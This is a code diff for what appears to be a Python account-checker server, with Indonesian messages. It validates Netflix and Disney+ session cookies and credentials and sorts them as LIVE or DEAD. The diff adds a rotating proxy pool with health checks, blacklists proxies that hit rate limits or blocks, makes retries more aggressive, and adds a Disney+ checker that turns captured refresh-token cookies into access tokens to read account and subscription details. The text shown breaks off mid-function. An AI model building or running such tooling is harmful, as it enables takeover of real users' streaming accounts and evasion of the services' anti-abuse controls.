@@ -18,10 +18,6 @@ from datetime import datetime
 import concurrent.futures
 import platform
 import requests
-from urllib3.exceptions import InsecureRequestWarning
-
-requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
-
 from expressvpn_checker import check_expressvpn_account
 
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
@@ -179,12 +175,31 @@ all_tested_proxies = []
 proxy_lock = threading.Lock()
 server_start_time = time.time()
 
+# ── Proxy Testing State & Cache ─────────────────────────────────────────────
+proxy_test_state = {
+    "running": False,
+    "stop_requested": False,
+    "total": 0,
+    "tested": 0,
+    "healthy": 0,
+    "dead": 0,
+    "speed": 0,
+    "eta_seconds": 0,
+    "start_time": 0,
+    "last_result": None
+}
+proxy_test_lock = threading.Lock()
+cached_proxies = []
+cached_proxies_mtime = 0
+cached_proxies_lock = threading.Lock()
+
 def get_config():
     if not os.path.exists(CONFIG_FILE):
         return {"pin": ""}
     try:
         with open(CONFIG_FILE, "r", encoding="utf-8") as f:
-            return json.load(f)
+            c = json.load(f)
+            return c
     except Exception:
         return {"pin": ""}
 
@@ -223,8 +238,93 @@ def init_db():
         if "email" not in cols:
             c.execute("ALTER TABLE history ADD COLUMN email TEXT DEFAULT ''")
         c.execute("CREATE INDEX IF NOT EXISTS idx_history_cookie_key ON history(cookie_key)")
+
+        c.execute('''
+            CREATE TABLE IF NOT EXISTS proxy_cache (
+                proxy_key TEXT PRIMARY KEY,
+                status TEXT,
+                latency INTEGER DEFAULT 0,
+                last_tested REAL DEFAULT 0
+            )
+        ''')
+        c.execute("CREATE INDEX IF NOT EXISTS idx_proxy_status ON proxy_cache(status)")
+
         conn.commit()
         conn.close()
+
+def get_cached_proxy_states():
+    with db_lock:
+        try:
+            conn = get_db()
+            c = conn.cursor()
+            c.execute("SELECT proxy_key, status, latency, last_tested FROM proxy_cache")
+            rows = c.fetchall()
+            conn.close()
+            return {r[0]: {"status": r[1], "latency": r[2], "last_tested": r[3]} for r in rows}
+        except Exception as e:
+            logging.error(f"Error reading proxy_cache: {e}")
+            return {}
+
+def update_cached_proxy_state(proxy_key, status, latency=0):
+    if not proxy_key:
+        return
+    with db_lock:
+        try:
+            conn = get_db()
+            c = conn.cursor()
+            now = time.time()
+            c.execute("""
+                INSERT INTO proxy_cache (proxy_key, status, latency, last_tested)
+                VALUES (?, ?, ?, ?)
+                ON CONFLICT(proxy_key) DO UPDATE SET
+                    status=excluded.status,
+                    latency=excluded.latency,
+                    last_tested=excluded.last_tested
+            """, (proxy_key, status, latency, now))
+            conn.commit()
+            conn.close()
+        except Exception as e:
+            logging.error(f"Error updating proxy_cache: {e}")
+
+def batch_update_cached_proxy_states(items):
+    if not items:
+        return
+    with db_lock:
+        try:
+            conn = get_db()
+            c = conn.cursor()
+            now = time.time()
+            data = [(k, s, l, now) for (k, s, l) in items if k]
+            c.executemany("""
+                INSERT INTO proxy_cache (proxy_key, status, latency, last_tested)
+                VALUES (?, ?, ?, ?)
+                ON CONFLICT(proxy_key) DO UPDATE SET
+                    status=excluded.status,
+                    latency=excluded.latency,
+                    last_tested=excluded.last_tested
+            """, data)
+            conn.commit()
+            conn.close()
+        except Exception as e:
+            logging.error(f"Error batch updating proxy_cache: {e}")
+
+def delete_from_proxy_cache(keys):
+    if not keys:
+        return
+    with db_lock:
+        try:
+            conn = get_db()
+            c = conn.cursor()
+            k_list = list(keys)
+            batch_size = 500
+            for i in range(0, len(k_list), batch_size):
+                chunk = k_list[i:i+batch_size]
+                placeholders = ",".join(["?"] * len(chunk))
+                c.execute(f"DELETE FROM proxy_cache WHERE proxy_key IN ({placeholders})", chunk)
+            conn.commit()
+            conn.close()
+        except Exception as e:
+            logging.error(f"Error deleting from proxy_cache: {e}")
 
 def save_history(entry_type, status, plan='', billing='', country='', route='', token_url='', raw_cookie='', email=''):
     with db_lock:
@@ -350,7 +450,7 @@ def get_history(limit=50, offset=0, search='', status='', plan='', entry_type=''
         ]
         return {"total": total, "items": items}
 
-def export_history_csv(search='', status='', plan=''):
+def export_history_csv(search='', status='', plan='', entry_type=''):
     with db_lock:
         conn = get_db()
         c = conn.cursor()
@@ -362,6 +462,9 @@ def export_history_csv(search='', status='', plan=''):
         if status:
             query += ' AND status = ?'
             params.append(status)
+        if entry_type:
+            query += ' AND type = ?'
+            params.append(entry_type)
         if plan:
             p_upper = plan.upper()
             if p_upper in ('PREMIUM', '4K'):
@@ -415,16 +518,45 @@ def get_analytics():
         country_counts = dict(c.fetchall())
         c.execute('SELECT plan, COUNT(*) FROM history WHERE (status = "LIVE" OR status = "HOLD") AND plan != "" GROUP BY plan ORDER BY COUNT(*) DESC LIMIT 6')
         plan_counts = dict(c.fetchall())
+
+        # Aggregate per-service metrics for Dashboard & Hub
+        c.execute('SELECT type, status, COUNT(*) FROM history GROUP BY type, status')
+        rows = c.fetchall()
+
+        services = {}
+        for r_type, r_status, count in rows:
+            st = (r_status or "").upper()
+            t = (r_type or "").lower()
+            if t in ('checker', 'single', 'bulk', 'netflix'):
+                t = 'netflix'
+            elif t in ('hotmail', 'outlook'):
+                t = 'outlook'
+
+            if t not in services:
+                services[t] = {"checks": 0, "live": 0, "bad": 0, "hold": 0}
+            services[t]["checks"] += count
+            if st in ('LIVE', 'PREMIUM', 'FREE'):
+                services[t]["live"] += count
+            elif st in ('BAD', 'DEAD', 'ERROR'):
+                services[t]["bad"] += count
+            else:
+                services[t]["hold"] += count
+
         conn.close()
-        return {"status_counts": status_counts, "country_counts": country_counts, "plan_counts": plan_counts}
+        return {
+            "status_counts": status_counts,
+            "country_counts": country_counts,
+            "plan_counts": plan_counts,
+            "services": services
+        }
 
 def clear_history(only_dead=False):
     with db_lock:
         conn = get_db()
         c = conn.cursor()
         if only_dead:
-            c.execute('DELETE FROM history WHERE status = "DEAD" OR status = "ERROR" OR status = "BAD"')
-            logging.info("Deleted only DEAD/ERROR/BAD history records.")
+            c.execute('DELETE FROM history WHERE status = "DEAD" OR status = "ERROR" OR status = "BAD" OR status = "LOCKED" OR status = "PHONE_LOCKED"')
+            logging.info("Deleted only DEAD/ERROR/BAD/LOCKED history records.")
         else:
             c.execute('DELETE FROM history')
             logging.info("History database cleared completely.")
@@ -449,7 +581,10 @@ def parse_single_proxy(line):
     if "@" in remainder:
         auth_part, netloc = remainder.split("@", 1)
         netloc_parts = netloc.split(":")
-        raw = f"{netloc_parts[0]}:{netloc_parts[1]}"
+        if len(netloc_parts) >= 2:
+            raw = f"{netloc_parts[0]}:{netloc_parts[1]}"
+        else:
+            raw = f"{netloc}:80"
         proxy = f"{actual_scheme}://{auth_part}@{netloc}"
         return {"raw": raw, "proxy": proxy, "line": p, "latency": 0, "status": "OK"}
 
@@ -462,88 +597,368 @@ def parse_single_proxy(line):
         return {"raw": f"{ip}:{port}", "proxy": f"{actual_scheme}://{ip}:{port}", "line": p, "latency": 0, "status": "OK"}
     return None
 
-def load_proxies():
+def load_proxies(force_reload=False):
+    global cached_proxies, cached_proxies_mtime, healthy_proxies, all_tested_proxies
     if not os.path.exists(PROXIES_FILE):
         return []
-    res = []
-    with open(PROXIES_FILE, "r", encoding="utf-8", errors="ignore") as f:
-        for line in f:
-            item = parse_single_proxy(line)
-            if item:
-                # Default status unverified/initial
-                item["status"] = "UNVERIFIED"
-                res.append(item)
-    return res
+    try:
+        mtime = os.path.getmtime(PROXIES_FILE)
+        with cached_proxies_lock:
+            if not force_reload and cached_proxies and mtime == cached_proxies_mtime:
+                return [dict(p) for p in cached_proxies]
+            
+            db_states = get_cached_proxy_states()
+            res = []
+            with open(PROXIES_FILE, "r", encoding="utf-8", errors="ignore") as f:
+                for idx, line in enumerate(f):
+                    item = parse_single_proxy(line)
+                    if item:
+                        item["id"] = idx + 1
+                        k = item.get("line") or item.get("proxy") or item.get("raw")
+                        cached = db_states.get(k) or db_states.get(item.get("raw")) or db_states.get(item.get("proxy"))
+                        if cached:
+                            item["status"] = cached["status"]
+                            item["latency"] = cached["latency"]
+                            item["last_tested"] = cached.get("last_tested", 0)
+                        else:
+                            item["status"] = "UNVERIFIED"
+                            item["latency"] = 0
+                            item["last_tested"] = 0
+                        res.append(item)
+            cached_proxies = res
+            cached_proxies_mtime = mtime
+            with proxy_lock:
+                all_tested_proxies = list(res)
+                healthy_proxies = [p for p in res if p.get("status") == "OK"]
+            return [dict(p) for p in res]
+    except Exception as e:
+        logging.error(f"Error loading proxies: {e}")
+        return []
 
-def check_proxy_health(p):
-    t0 = time.time()
-    candidates = [p["proxy"]]
-    if p["proxy"].startswith("http://"):
-        candidates.append("https://" + p["proxy"][7:])
-    elif p["proxy"].startswith("https://"):
-        candidates.append("http://" + p["proxy"][8:])
-    elif p["proxy"].startswith("socks5://"):
-        candidates.append("socks5h://" + p["proxy"][9:])
-    elif p["proxy"].startswith("socks4://"):
-        candidates.append("socks4a://" + p["proxy"][9:])
-
-    for prx in candidates:
+def check_proxy_health(p, timeout=(3.0, 4.0), retries=1):
+    prx = p.get("proxy") if isinstance(p, dict) else str(p)
+    if not prx:
+        return False, 0
+    proxies = {"http": prx, "https": prx}
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+        "Accept": "*/*"
+    }
+    for attempt in range(retries + 1):
+        t0 = time.time()
         try:
-            proxies = {"http": prx, "https": prx}
-            r = requests.get("https://www.netflix.com/favicon.ico", proxies=proxies, timeout=6, verify=False)
+            to = timeout if attempt == 0 else (3.5, 5.0)
+            r = requests.get("https://www.netflix.com/favicon.ico", proxies=proxies, timeout=to, verify=True, headers=headers)
             if r.status_code in (200, 301, 302, 404):
-                p["proxy"] = prx
                 latency = int((time.time() - t0) * 1000)
                 return True, latency
         except Exception:
             pass
+        if attempt < retries:
+            time.sleep(0.2)
     return False, 0
+
+def test_single_proxy_func(proxy_str):
+    global healthy_proxies, all_tested_proxies
+    item = parse_single_proxy(proxy_str)
+    if not item:
+        item = {"raw": proxy_str, "proxy": f"http://{proxy_str}", "line": proxy_str, "latency": 0, "status": "UNVERIFIED"}
+    ok, lat = check_proxy_health(item, timeout=(3.0, 4.5), retries=1)
+    item["status"] = "OK" if ok else "FAIL"
+    item["latency"] = lat if ok else 0
+    k = item.get("line") or item.get("proxy") or item.get("raw")
+    update_cached_proxy_state(k, item["status"], item["latency"])
+
+    with proxy_lock:
+        if not all_tested_proxies:
+            all_tested_proxies = list(load_proxies())
+        found = False
+        for p in all_tested_proxies:
+            pk = p.get("line") or p.get("proxy") or p.get("raw")
+            if pk == k or p.get("raw") == item.get("raw"):
+                p["status"] = item["status"]
+                p["latency"] = item["latency"]
+                found = True
+                break
+        if not found:
+            all_tested_proxies.append(item)
+        healthy_proxies = [p for p in all_tested_proxies if p.get("status") == "OK"]
+    return ok, lat, item
+
+def stop_background_proxy_test():
+    global proxy_test_state
+    with proxy_test_lock:
+        if proxy_test_state["running"]:
+            proxy_test_state["stop_requested"] = True
+            return True, "Menghentikan pengujian proxy..."
+        return False, "Tidak ada pengujian yang sedang berjalan"
+
+def start_background_proxy_test(limit=100, mode="untested"):
+    global proxy_test_state, healthy_proxies, all_tested_proxies
+    with proxy_test_lock:
+        if proxy_test_state["running"]:
+            return False, "Test proxy sedang berlangsung di background"
+        proxy_test_state["running"] = True
+        proxy_test_state["stop_requested"] = False
+        proxy_test_state["start_time"] = time.time()
+        proxy_test_state["tested"] = 0
+        proxy_test_state["healthy"] = 0
+        proxy_test_state["dead"] = 0
+        proxy_test_state["speed"] = 0
+        proxy_test_state["eta_seconds"] = 0
+
+    def _worker():
+        global healthy_proxies, all_tested_proxies
+        try:
+            with proxy_lock:
+                current_pool = list(all_tested_proxies) if all_tested_proxies else load_proxies()
+            
+            if mode == "untested":
+                candidates = [p for p in current_pool if p.get("status") in ("UNVERIFIED", "UNTESTED", "READY")]
+                if not candidates:
+                    candidates = current_pool
+            elif mode == "dead":
+                candidates = [p for p in current_pool if p.get("status") == "FAIL"]
+            else: # "all"
+                candidates = list(current_pool)
+
+            if limit and limit > 0:
+                candidates = candidates[:limit]
+
+            total_cand = len(candidates)
+            with proxy_test_lock:
+                proxy_test_state["total"] = total_cand
+
+            tested_map = {}
+            db_batch = []
+            db_batch_lock = threading.Lock()
+
+            def _test_item(p):
+                with proxy_test_lock:
+                    if proxy_test_state.get("stop_requested"):
+                        return None
+
+                ok, lat = check_proxy_health(p, timeout=(3.0, 4.0), retries=1)
+                p_copy = dict(p)
+                p_copy["latency"] = lat if ok else 0
+                p_copy["status"] = "OK" if ok else "FAIL"
+                p_copy["last_tested"] = time.time()
+
+                k = p_copy.get("line") or p_copy.get("proxy") or p_copy.get("raw")
+                with db_batch_lock:
+                    db_batch.append((k, p_copy["status"], p_copy["latency"]))
+                    if len(db_batch) >= 50:
+                        batch_update_cached_proxy_states(list(db_batch))
+                        db_batch.clear()
+
+                with proxy_test_lock:
+                    proxy_test_state["tested"] += 1
+                    if ok:
+                        proxy_test_state["healthy"] += 1
+                    else:
+                        proxy_test_state["dead"] += 1
+                    
+                    elapsed = max(0.1, time.time() - proxy_test_state["start_time"])
+                    speed = proxy_test_state["tested"] / elapsed
+                    proxy_test_state["speed"] = round(speed, 1)
+                    rem_items = max(0, total_cand - proxy_test_state["tested"])
+                    proxy_test_state["eta_seconds"] = int(rem_items / speed) if speed > 0 else 0
+
+                return p_copy
+
+            max_workers = min(100, max(20, total_cand // 5 or 20))
+            with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as ex:
+                results = list(ex.map(_test_item, candidates))
+
+            with db_batch_lock:
+                if db_batch:
+                    batch_update_cached_proxy_states(db_batch)
+                    db_batch.clear()
+
+            for r in results:
+                if r:
+                    k = r.get("line") or r.get("proxy") or r.get("raw")
+                    tested_map[k] = r
+
+            with proxy_lock:
+                updated_all = []
+                for p in current_pool:
+                    k = p.get("line") or p.get("proxy") or p.get("raw")
+                    if k in tested_map:
+                        updated_all.append(tested_map[k])
+                    else:
+                        updated_all.append(p)
+                all_tested_proxies = updated_all
+                healthy_proxies = [p for p in updated_all if p.get("status") == "OK"]
+        except Exception as ex:
+            logging.error(f"Proxy test worker error: {ex}")
+        finally:
+            with proxy_test_lock:
+                proxy_test_state["running"] = False
+                proxy_test_state["last_result"] = {
+                    "tested": proxy_test_state["tested"],
+                    "healthy": proxy_test_state["healthy"],
+                    "dead": proxy_test_state["dead"],
+                    "elapsed": int(time.time() - proxy_test_state["start_time"])
+                }
+
+    threading.Thread(target=_worker, daemon=True).start()
+    lim_label = "semua" if (not limit or limit <= 0) else f"{limit}"
+    return True, f"Menjalankan benchmark test untuk {lim_label} proxy dengan high-concurrency engine..."
+
+def clean_dead_proxies_serverside():
+    global healthy_proxies, all_tested_proxies
+    with proxy_lock:
+        dead_keys = set()
+        for p in all_tested_proxies:
+            if p.get("status") == "FAIL":
+                if p.get("line"): dead_keys.add(p["line"].strip())
+                if p.get("raw"): dead_keys.add(p["raw"].strip())
+                if p.get("proxy"): dead_keys.add(p["proxy"].strip())
+
+        if not dead_keys:
+            all_p = all_tested_proxies if all_tested_proxies else load_proxies()
+            return 0, len(all_p)
+
+        delete_from_proxy_cache(dead_keys)
+
+        remaining = []
+        removed = 0
+        if os.path.exists(PROXIES_FILE):
+            with open(PROXIES_FILE, "r", encoding="utf-8", errors="ignore") as f:
+                for line in f:
+                    s = line.strip()
+                    if not s or s.startswith("#"):
+                        remaining.append(s)
+                        continue
+                    parsed = parse_single_proxy(s)
+                    is_dead = (s in dead_keys) or (parsed and (parsed.get("raw") in dead_keys or parsed.get("proxy") in dead_keys))
+                    if is_dead:
+                        removed += 1
+                    else:
+                        remaining.append(s)
+            with open(PROXIES_FILE, "w", encoding="utf-8") as f:
+                f.write("\n".join(remaining) + "\n")
+
+        all_tested_proxies = [p for p in all_tested_proxies if p.get("status") != "FAIL"]
+        healthy_proxies = [p for p in all_tested_proxies if p.get("status") == "OK"]
+        load_proxies(force_reload=True)
+        return removed, len(remaining)
+
+def remove_proxies_flexible(target_set):
+    global healthy_proxies, all_tested_proxies
+    remaining = []
+    removed = 0
+    delete_from_proxy_cache(target_set)
+    if os.path.exists(PROXIES_FILE):
+        with open(PROXIES_FILE, "r", encoding="utf-8", errors="ignore") as f:
+            for line in f:
+                s = line.strip()
+                if not s or s.startswith("#"):
+                    remaining.append(s)
+                    continue
+                parsed = parse_single_proxy(s)
+                matched = (s in target_set) or (parsed and (parsed.get("raw") in target_set or parsed.get("proxy") in target_set))
+                if matched:
+                    removed += 1
+                else:
+                    remaining.append(s)
+        with open(PROXIES_FILE, "w", encoding="utf-8") as f:
+            f.write("\n".join(remaining) + "\n")
+
+    with proxy_lock:
+        all_tested_proxies.clear()
+        healthy_proxies.clear()
+    load_proxies(force_reload=True)
+    return removed, len(remaining)
 
 def proxy_health_worker():
     global healthy_proxies, all_tested_proxies
-    while True:
-        all_p = load_proxies()
-        good = []
-        def _bg_test(p):
-            ok, lat = check_proxy_health(p)
-            if ok:
-                p["latency"] = lat
-                p["status"] = "OK"
-            else:
-                p["latency"] = 0
-                p["status"] = "FAIL"
-            return p
-
-        with concurrent.futures.ThreadPoolExecutor(max_workers=16) as ex:
-            tested = list(ex.map(_bg_test, all_p))
-
-        good = [p for p in tested if p["status"] == "OK"]
+    time.sleep(3)
+    # Quick initial warmup if healthy pool is empty or low
+    try:
         with proxy_lock:
-            all_tested_proxies = tested
-            healthy_proxies = good
-        time.sleep(300)
+            h_len = len(healthy_proxies)
+        if h_len < 10:
+            start_background_proxy_test(limit=250, mode="untested")
+    except Exception as e:
+        logging.error(f"Proxy warmup error: {e}")
 
-def test_all_proxies_now():
-    global healthy_proxies, all_tested_proxies
-    all_p = load_proxies()
-    def _test_single(p):
-        ok, lat = check_proxy_health(p)
-        if ok:
-            p["latency"] = lat
-            p["status"] = "OK"
-        else:
-            p["latency"] = 0
-            p["status"] = "FAIL"
-        return p
+    while True:
+        try:
+            # Run balanced health balancing every 90 seconds in gentle batches
+            time.sleep(90)
 
-    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
-        tested = list(ex.map(_test_single, all_p))
-    
-    good = [p for p in tested if p["status"] == "OK"]
-    with proxy_lock:
-        all_tested_proxies = list(tested)
-        healthy_proxies = good
-    return tested
+            # Skip auto-cycle if manual batch test is active
+            with proxy_test_lock:
+                if proxy_test_state.get("running"):
+                    continue
+
+            with proxy_lock:
+                if not all_tested_proxies:
+                    all_tested_proxies = load_proxies()
+                all_p = list(all_tested_proxies)
+
+            if not all_p:
+                continue
+
+            # BALANCED TRI-POOL HEALTH SAMPLING:
+            # 1. Sample Healthy proxies: verify still alive (oldest tested first)
+            healthy_pool = [p for p in all_p if p.get("status") == "OK"]
+            healthy_pool.sort(key=lambda x: x.get("last_tested", 0))
+            sample_healthy = healthy_pool[:80]
+
+            # 2. AUTO-REVIVAL: Sample Dead (FAIL) proxies to resurrect recovered ones!
+            dead_pool = [p for p in all_p if p.get("status") == "FAIL"]
+            dead_pool.sort(key=lambda x: x.get("last_tested", 0))
+            sample_dead = dead_pool[:60]
+
+            # 3. AUTO-WARMUP: Sample Unverified/Untested proxies
+            untested_pool = [p for p in all_p if p.get("status") in ("UNVERIFIED", "UNTESTED", "READY")]
+            sample_untested = untested_pool[:40]
+
+            batch_to_test = sample_healthy + sample_dead + sample_untested
+            if not batch_to_test:
+                continue
+
+            def _bg_test_item(p):
+                ok, lat = check_proxy_health(p, timeout=(3.0, 4.0), retries=1)
+                p_copy = dict(p)
+                p_copy["latency"] = lat if ok else 0
+                p_copy["status"] = "OK" if ok else "FAIL"
+                p_copy["last_tested"] = time.time()
+                return p_copy
+
+            with concurrent.futures.ThreadPoolExecutor(max_workers=25) as ex:
+                tested_results = list(ex.map(_bg_test_item, batch_to_test))
+
+            db_updates = []
+            tested_map = {}
+            for r in tested_results:
+                if r:
+                    k = r.get("line") or r.get("proxy") or r.get("raw")
+                    db_updates.append((k, r["status"], r["latency"]))
+                    tested_map[k] = r
+
+            if db_updates:
+                batch_update_cached_proxy_states(db_updates)
+
+            with proxy_lock:
+                for k, r in tested_map.items():
+                    for p in all_tested_proxies:
+                        pk = p.get("line") or p.get("proxy") or p.get("raw")
+                        if pk == k or p.get("raw") == r.get("raw"):
+                            p["status"] = r["status"]
+                            p["latency"] = r["latency"]
+                            p["last_tested"] = r["last_tested"]
+                            break
+                healthy_proxies = [p for p in all_tested_proxies if p.get("status") == "OK"]
+        except Exception as e:
+            logging.error(f"proxy_health_worker error: {e}")
+
+def test_all_proxies_now(limit=100):
+    start_background_proxy_test(limit=limit, mode="all")
+    return {"ok": True, "message": f"Testing up to {limit} proxies in background"}
 
 proxy_cooldown = {}
 proxy_cooldown_lock = threading.Lock()
@@ -555,16 +970,25 @@ def mark_proxy_cooldown(proxy_url, duration=600):
         proxy_cooldown[proxy_url] = time.time() + duration
 
 def get_random_proxy():
-    global healthy_proxies
+    global healthy_proxies, all_tested_proxies
     now = time.time()
     with proxy_lock:
-        pool = list(healthy_proxies) if healthy_proxies else load_proxies()
+        if healthy_proxies:
+            pool = list(healthy_proxies)
+        else:
+            if not all_tested_proxies:
+                all_tested_proxies = load_proxies()
+            pool = [p for p in all_tested_proxies if p.get("status") != "FAIL"]
+            if not pool and all_tested_proxies:
+                pool = list(all_tested_proxies)
+    if not pool:
+        return None, None, None
+
     with proxy_cooldown_lock:
         valid_pool = [p for p in pool if proxy_cooldown.get(p["proxy"], 0) <= now]
     if not valid_pool:
         valid_pool = pool
-    if not valid_pool:
-        return None, None, None
+
     choice = random.choice(valid_pool)
     lat_info = f" ({choice.get('latency', 0)}ms)" if choice.get("latency") else ""
     return {"http": choice["proxy"], "https": choice["proxy"]}, f"{choice['raw']}{lat_info}", choice["proxy"]
@@ -586,19 +1010,20 @@ def generate_nftoken(cookie_text, use_proxy=True):
     headers = dict(BASE_HEADERS)
     headers["Cookie"] = f"NetflixId={nid}"
 
-    # Auto-retry exponential backoff max 1 retry
-    max_retries = 1
+    # Aggressive retry: 5 attempts, each with fresh proxy, dead proxy instantly blacklisted
+    max_retries = 5
     last_err = None
 
-    for attempt in range(max_retries + 1):
-        if use_proxy:
+    for attempt in range(max_retries):
+        # First 2 attempts: try proxy; last 3 attempts: direct (direct proven working)
+        if use_proxy and attempt < 2:
             proxies, proxy_label, proxy_raw_url = get_random_proxy()
         else:
             proxies, proxy_label, proxy_raw_url = None, None, None
         route = f"Proxy ({proxy_label})" if proxy_label else "Direct"
 
         try:
-            res = requests.get(API_URL, params=QUERY_PARAMS, headers=headers, proxies=proxies, timeout=18, verify=False)
+            res = requests.get(API_URL, params=QUERY_PARAMS, headers=headers, proxies=proxies, timeout=12, verify=True)
             if res.status_code in (403, 429) and proxy_raw_url:
                 mark_proxy_cooldown(proxy_raw_url, 600)
             res.raise_for_status()
@@ -625,8 +1050,11 @@ def generate_nftoken(cookie_text, use_proxy=True):
 
         except Exception as e:
             last_err = e
-            if attempt < max_retries:
-                time.sleep(1.0 * (attempt + 1))
+            # Immediately blacklist this proxy on connection/timeout error
+            if proxy_raw_url and ("proxy" in str(e).lower() or "timeout" in str(e).lower() or "connect" in str(e).lower()):
+                mark_proxy_cooldown(proxy_raw_url, 1800)
+            if attempt < max_retries - 1:
+                time.sleep(0.5)
                 continue
 
     raise last_err
@@ -644,11 +1072,13 @@ def check_netflix_membership(cookie_text, use_proxy=True):
         'Referer': 'https://www.netflix.com/browse',
     }
 
-    max_retries = 1
+    # Aggressive retry: 5 attempts, each with fresh proxy
+    max_retries = 5
     last_err = None
 
-    for attempt in range(max_retries + 1):
-        if use_proxy:
+    for attempt in range(max_retries):
+        # First 2 attempts: try proxy; last 3 attempts: direct (direct proven working)
+        if use_proxy and attempt < 2:
             proxies, proxy_label, proxy_raw_url = get_random_proxy()
         else:
             proxies, proxy_label, proxy_raw_url = None, None, None
@@ -663,9 +1093,9 @@ def check_netflix_membership(cookie_text, use_proxy=True):
                 'https://www.netflix.com/account/membership',
                 headers=headers,
                 proxies=proxies,
-                timeout=7,
+                timeout=10,
                 allow_redirects=True,
-                verify=False
+                verify=True
             )
 
             if r.status_code in (403, 429) and proxy_raw_url:
@@ -852,12 +1282,15 @@ def check_netflix_membership(cookie_text, use_proxy=True):
             }
         except Exception as e:
             last_err = e
-            if attempt < max_retries:
-                time.sleep(1.0 * (attempt + 1))
+            # Blacklist dead/timeout proxy immediately
+            if proxy_raw_url and ("proxy" in str(e).lower() or "timeout" in str(e).lower() or "connect" in str(e).lower()):
+                mark_proxy_cooldown(proxy_raw_url, 1800)
+            if attempt < max_retries - 1:
+                time.sleep(0.5)
                 continue
 
     save_history("checker", "ERROR", route=route, raw_cookie=cookie_text)
-    return {"live": False, "status": "ERROR", "reason": f"Request gagal setelah retry: {str(last_err)}", "route": route}
+    return {"live": False, "status": "ERROR", "reason": f"Request gagal setelah {max_retries}x retry (semua proxy timeout): {str(last_err)}", "route": route}
 
 # ══════════════════════════════════════════════════════════════════════════════
 # Disney+ Account Checker (BAMTech reverse-engineered flow)
@@ -1233,6 +1666,163 @@ def check_disney_account(email, password, use_proxy=True):
 
 
 # ══════════════════════════════════════════════════════════════════════════════
+# Disney+ Cookie Checker (refresh_token cookie → token exchange → profile)
+# ══════════════════════════════════════════════════════════════════════════════
+
+DISNEY_REFRESH_COOKIE_NAMES = ("refresh_token", "_disney_s2", "BAMSDK_refresh_token")
+
+def extract_disney_refresh_token(cookie_text):
+    """Parse refresh_token from Netscape .txt, JSON array, refresh_token=XXX string, or raw token."""
+    if not cookie_text:
+        return None
+
+    text = str(cookie_text).strip()
+
+    # 1. JSON array format [{"name":"refresh_token","value":"xxx"}, ...]
+    json_match = re.search(r'\[\s*\{[\s\S]*?\}\s*\]', text)
+    if json_match:
+        try:
+            parsed = json.loads(json_match.group(0))
+            if isinstance(parsed, list):
+                for c in parsed:
+                    if isinstance(c, dict):
+                        n = c.get("name", "")
+                        v = c.get("value", "")
+                        if n in DISNEY_REFRESH_COOKIE_NAMES and v:
+                            return v
+        except Exception:
+            pass
+
+    # 2. Netscape format (tab-separated) — look for known cookie names in column 6
+    for raw_line in text.splitlines():
+        line = raw_line.strip()
+        if not line or line.startswith("#"):
+            continue
+        parts = line.split("\t")
+        if len(parts) >= 7 and parts[5] in DISNEY_REFRESH_COOKIE_NAMES:
+            return parts[6]
+
+    # 3. Raw string: refresh_token=XXXXXX; _disney_s2=XXXXXX; BAMSDK_refresh_token=XXXXXX
+    for cookie_name in DISNEY_REFRESH_COOKIE_NAMES:
+        m = re.search(rf'(?:^|[;\s]){re.escape(cookie_name)}=([^\s;,]+)', text)
+        if m:
+            return m.group(1)
+
+    # 4. If text is just a raw token value (no = sign, long string), treat as refresh_token
+    if len(text) > 50 and not any(c in text for c in ('=', '\t', '{', '[')):
+        return text
+
+    return None
+
+
+def check_disney_cookie(cookie_text, use_proxy=True):
+    """Check a Disney+ account using refresh_token cookie: token exchange → profile → subscription."""
+    refresh_token = extract_disney_refresh_token(cookie_text)
+    if not refresh_token:
+        save_history("disney", "DEAD", raw_cookie=cookie_text)
+        return {"status": "DEAD", "reason": "Disney+ refresh_token not found in input."}
+
+    proxy_url = None
+    proxy_label = "Direct"
+    proxy_raw_url = None
+    if use_proxy:
+        prx, label, raw_url = get_random_proxy()
+        if prx:
+            proxy_url = prx.get("http") or prx.get("https")
+            proxy_label = label or "Proxy"
+            proxy_raw_url = raw_url
+
+    opener = _disney_make_opener(proxy_url)
+    timeout = 20
+
+    # Step 1: Exchange refresh_token for access_token via /token endpoint
+    try:
+        tok = _disney_token_form(opener, {
+            "grant_type": "refresh_token",
+            "refresh_token": refresh_token,
+            "platform": "browser",
+            "latitude": "0",
+            "longitude": "0",
+        }, timeout)
+
+        if tok.get("_error") in (403, 429) and proxy_raw_url:
+            mark_proxy_cooldown(proxy_raw_url, 600)
+
+        acc_tok = tok.get("access_token")
+        if not acc_tok:
+            error_desc = tok.get("error_description", "") or tok.get("error", "") or str(tok.get("_error", ""))
+            if tok.get("_error") == 401 or "invalid" in error_desc.lower() or "expired" in error_desc.lower():
+                save_history("disney", "DEAD", route=proxy_label, raw_cookie=cookie_text)
+                return {"status": "DEAD", "reason": f"Refresh token expired or invalid: {error_desc[:100]}", "route": proxy_label}
+            save_history("disney", "ERROR", route=proxy_label, raw_cookie=cookie_text)
+            return {"status": "ERROR", "reason": f"Token exchange failed: {error_desc[:100]}", "route": proxy_label}
+    except Exception as exc:
+        save_history("disney", "ERROR", route=proxy_label, raw_cookie=cookie_text)
+        return {"status": "ERROR", "reason": f"Token request failed: {str(exc)[:100]}", "route": proxy_label}
+
+    # Step 2: /accounts/me
+    s_me, me = _disney_get_json(opener, DISNEY_ACCOUNTS_ME, acc_tok, timeout)
+    if s_me != 200:
+        me = {}
+
+    # Step 3: /v2/subscribers
+    s_subs, v2 = _disney_get_json(opener, DISNEY_SUBSCRIBERS, acc_tok, timeout)
+    if s_subs != 200:
+        v2 = {"subscriberStatus": "UNKNOWN", "subscriptions": []}
+
+    # Step 4: /subscriptions
+    subscriptions_raw = []
+    s_rs, rs = _disney_get_json(opener, DISNEY_SUBSCRIPTIONS, acc_tok, timeout)
+    if s_rs == 200 and isinstance(rs, list):
+        subscriptions_raw = rs
+
+    # Extract info
+    attrs = me.get("attributes", {})
+    disney_email = attrs.get("email", "")
+    email_verified = str(attrs.get("emailVerified", False)).lower()
+    country = _disney_get_country(me)
+    country_name = normalize_country(country) if len(country) == 2 else country
+
+    subscriber_status = v2.get("subscriberStatus", "UNKNOWN")
+    v2_subs = v2.get("subscriptions", [])
+    active = _disney_get_active_sub(v2_subs)
+
+    if active:
+        product = active.get("product", {})
+        plan_name = product.get("name") or "Disney Plus"
